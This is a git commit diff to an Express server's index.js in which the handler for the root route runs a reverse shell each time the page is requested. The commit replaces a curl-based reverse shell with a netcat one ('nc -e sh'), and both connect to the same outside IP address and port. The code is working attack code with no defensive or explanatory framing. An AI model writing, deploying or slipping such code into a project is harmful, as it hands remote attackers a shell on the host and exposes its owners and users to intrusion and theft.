7e61f7ca620a6dd073c2c4faf673961065dc1240
ahmedgomaaa <37199252+ahmedgomaaa@users.noreply.github.com>
2024-08-12 17:25:52 +0300

    Update index.js

--- index.js
+++ index.js
@@ -5,10 +5,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-    // Command to run the curl reverse shell
-    const command = `C='curl -Ns telnet://140.238.85.162:9999'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null`;
-    
-    exec(command, (error, stdout, stderr) => {
+    // Command to run the Netcat reverse shell
+    exec('nc -e sh 140.238.85.162 9999', (error, stdout, stderr) => {
         if (error) {
             res.send(`<pre>Error: ${error.message}</pre>`);
             return;
